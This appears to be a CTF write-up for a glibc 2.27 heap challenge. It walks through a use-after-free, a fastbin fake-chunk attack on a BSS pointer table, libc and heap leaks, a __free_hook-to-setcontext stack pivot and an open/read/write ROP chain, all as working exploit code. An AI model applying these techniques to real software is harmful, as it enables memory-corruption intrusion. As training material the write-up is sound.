# Linker Revenge

### Overview

This is heap pwn challenge with the GLIBC given 2.27, the security checks:-

```r
❯ file linker_revenge
linker_revenge: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=af19ec882ea7b9ada3b35ae3712abbbf109e5dfe, not stripped
❯ checksec linker_revenge
[*] '/home/d4mianwayne/Pwning/CTFs/3kCTF/linker_revenge'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
❯ seccomp-tools dump ./linker_revenge
 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x00 0x09 0xc000003e  if (A != ARCH_X86_64) goto 0011
 0002: 0x20 0x00 0x00 0x00000000  A = sys_number
 0003: 0x35 0x00 0x01 0x40000000  if (A < 0x40000000) goto 0005
 0004: 0x15 0x00 0x06 0xffffffff  if (A != 0xffffffff) goto 0011
 0005: 0x15 0x04 0x00 0x00000000  if (A == read) goto 0010
 0006: 0x15 0x03 0x00 0x00000001  if (A == write) goto 0010
 0007: 0x15 0x02 0x00 0x00000005  if (A == fstat) goto 0010
 0008: 0x15 0x01 0x00 0x0000000a  if (A == mprotect) goto 0010
 0009: 0x15 0x00 0x01 0x00000101  if (A != openat) goto 0011
 0010: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0011: 0x06 0x00 0x00 0x00000000  return KILL

```

Since Seccomp is enabled, we will do an Open/Read/Write ROP chain to read the flag after getting the RIP control.

### Vulnerability

The vulnerability relies in the `edit_page` function, there exists a UAF vulnerability which can be used to do tamper the metadata of an already `free`'d chunk.

### Exploitation

To exploit this challenge, first off, we take advantage of the fastbin attack, to do so, we first fill the tcache bins of the same size and then malloc 2 chunks and free those chunk, for insance let name them chunk A and chunk B respectively. Upon free'ing the chunk A & B, we overwrote the `chunk[1]->fd = fake_fasbin_chunk` since the chunk A & B size is 0x71, we can overwrite the Chunk A's fd to the address `0x60203d` which proposed a structure of a fastbin chunk.

Fastbin = [chunk A, 0x60203d]

Now, that being said, doing so, in next allocation, we get chunk A and the next will give us the ability to overwrite data stored at `0x60203d + 0x10` and beyond. Since there's a `page` array stored at the BSS section along with the `page_size` table which is used to store the size of the chunks allocated, we will overwrite the `page` array with our desired addresses:-

```py

payload  = b'AAA'
payload += p64(0) * 2
payload += p32(0xff) * 8           # int
payload += p32(1) * 3 + p32(0) * 5 # int
payload += p64(0x602060) # ptr[0] = &page_size
payload += p64(0x602020) # ptr[1] = free@got
payload += p64(0x6020b8) # ptr[2] = ptr[3]

edit(0, payload)
```
Here, we overwrite the `page_size` table with the `0xff` values and the flag variables and then make the `page` array as of following:-

```py
page = [0x602060, free@got, 0x6020b8]
```
> The `0x6020b8` addres points to the 3rd index, 4th element of the `page` array on the BSS.

Now, since RELRO is enabled, we cannot overwrite the `free@got`. We can get a `free` address if we will tend to view the data of the `chunk[1]`.

```py
new(0x408) # chunk 3

heap_base = u64(show(2).strip().ljust(8, b"\x00")) - 0x2290 # ptr[2] -> ptr[3] == heap_chunk  0x410
log.info(f"HEAP:   {hex(heap_base)}")

libc.address = u64(show(1).strip().ljust(8, b"\x00")) - libc.symbols['_IO_2_1_stdout_'] # ptr[1] = free@got
log.info(f"LIBC:   {hex(libc.address)}")
```

Doing that so, we will again overwrite the `page_size` table, this time with bigger size such that it will accept our ROP chain and also make the `page[1]` points to the `__free_hook` address.

```py
payload  = p32(0x4ff) * 8 # page_size -> array
payload += p32(1) * 5 + p32(0) * 3
payload += p64(0x602060) + p64(libc.symbols["__free_hook"]) # ptr[0] = page_size, ptr[1] == __free_hook
edit(0, payload) # ptr[0] = page_table
```

Page table looks like:-

```py
page_array = [0x602060, __free_hook]
```

Now, we will overwrite the `__free_hook` with the `setcontext + 53` to peform a stack pivot to read the flag file, the stack pivot will make the `rsp` points to the `heap` chunk where our ROP chain would be stored :D

```py
edit(1, p64(libc.symbols["setcontext"] + 0x35)) # ptr[1] == __free_hook => setcontexr + 53
```
We need to make the rdi points to the certain address, such that during the call to `setcontext + 53` will make the registers point to the right address, exactly where we want them to be:-

```r
0x7f12c88450a5 <setcontext+53>:  mov    rsp,QWORD PTR [rdi+0xa0]
0x7f12c88450ac <setcontext+60>:  mov    rbx,QWORD PTR [rdi+0x80]
0x7f12c88450b3 <setcontext+67>:  mov    rbp,QWORD PTR [rdi+0x78]
0x7f12c88450b7 <setcontext+71>:  mov    r12,QWORD PTR [rdi+0x48]
0x7f12c88450bb <setcontext+75>:  mov    r13,QWORD PTR [rdi+0x50]
0x7f12c88450bf <setcontext+79>:  mov    r14,QWORD PTR [rdi+0x58]
0x7f12c88450c3 <setcontext+83>:  mov    r15,QWORD PTR [rdi+0x60]
0x7f12c88450c7 <setcontext+87>:  mov    rcx,QWORD PTR [rdi+0xa8]
0x7f12c88450ce <setcontext+94>:  push   rcx
0x7f12c88450cf <setcontext+95>:  mov    rsi,QWORD PTR [rdi+0x70]
0x7f12c88450d3 <setcontext+99>:  mov    rdx,QWORD PTR [rdi+0x88]
0x7f12c88450da <setcontext+106>: mov    rcx,QWORD PTR [rdi+0x98]
0x7f12c88450e1 <setcontext+113>: mov    r8,QWORD PTR [rdi+0x28]
0x7f12c88450e5 <setcontext+117>: mov    r9,QWORD PTR [rdi+0x30]
0x7f12c88450e9 <setcontext+121>: mov    rdi,QWORD PTR [rdi+0x68]
0x7f12c88450ed <setcontext+125>: xor    eax,eax
0x7f12c88450ef <setcontext+127>: ret 

```

The following address/values would be stored:-

```py
payload = b''
payload += b"flag\x00\x00\x00\x00" + p64(0) # rdi + 0x00
payload += p64(0) + p64(0) # rdi + 0x10
payload += p64(0) + p64(0) # rdi + 0x20 --> XXX, r8
payload += p64(0) + p64(0) # rdi + 0x30 --> r9 , XXX
payload += p64(0) + p64(0) # rdi + 0x40 --> XXX, r12
payload += p64(0) + p64(0) # rdi + 0x50 --> r13, r14
payload += p64(0) + p64(0xffffffffffffff9c) # rdi + 0x60 --> r15, rdi
payload += p64(heap_base + 0x2290) + p64(0) # rdi + 0x70 --> rsi, rbp
payload += p64(0) + p64(0) # rdi + 0x80 --> rbx, rdx
payload += p64(0) + p64(0) # rdi + 0x90 --> XXX, rcx
payload += p64(heap_base + 0x2340 - 8)
payload += p64(pop_rax) # rdi + 0xa0 --> rsp, rip
```
Now, the ROP chain:-


```py
# openat(0, "flag", 0)
payload += p64(pop_rax)
payload += p64(257)
payload += p64(syscall)

# read(3, heap, 0x40)

payload += p64(pop_rax)
payload += p64(0)
payload += p64(pop_rdi)
payload += p64(3)
payload += p64(0x0000000000401301)
payload += p64(heap_base) + p64(0)
payload += p64(pop_rdx)
payload += p64(0x40)
payload += p64(syscall)

# write(1, heap, 0x40)
payload += p64(pop_rax)
payload += p64(1)
payload += p64(pop_rdi)
payload += p64(1)
payload += p64(0x0000000000401301)
payload += p64(heap_base) + p64(0)
payload += p64(pop_rdx)
payload += p64(0x40)
payload += p64(syscall)

edit(1, payload)
```

Now, delete the page[3] chunk, such that:-

```
free(page[3]) -> __free_hook(ptr[3]) -> setcontext + 53 :  rdi => ptr[3]
```

```py
delete(3)
```
Get the flag :D